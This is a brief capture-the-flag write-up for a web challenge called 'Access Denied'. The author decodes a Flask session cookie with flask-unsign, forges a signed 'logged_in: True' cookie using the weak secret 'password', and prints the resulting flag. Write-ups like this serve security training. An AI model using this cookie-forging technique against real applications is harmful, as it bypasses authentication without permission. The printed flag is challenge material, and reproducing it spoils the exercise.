Page:
Access Denied

Fist of all i didnt have any clue so i checked all parts of inspect element and i found out an unprotected cookie so i decoded it and then generated a cookie to authorise and get the flag


┌──(santey22㉿DESKTOP-4L8F315)-[~]
└─$ flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.Yg9geQ.s8MKSRemMQyS5S60QTS0lY0Xg0o'
{'logged_in': False}


┌──(santey22㉿DESKTOP-4L8F315)-[~]                                                                                   └─$ flask-unsign --sign --cookie "{'logged_in': True}" --secret 'password'                                          
eyJsb2dnZWRfaW4iOnRydWV9.aqhJxQ.F0Bd2Nczyw3XIeAbFFvMLgmz6CM      

and then i used the cookie to authorise and changed the value using EditThisCookie extension and i got the following result:

You are logged in! 
CTF{66bf8ba5c3ee2bd230f5cc2de57c1f09f471de8833eae3ff7566da21eb141eb7}

Flag:
**CTF{66bf8ba5c3ee2bd230f5cc2de57c1f09f471de8833eae3ff7566da21eb141eb7}**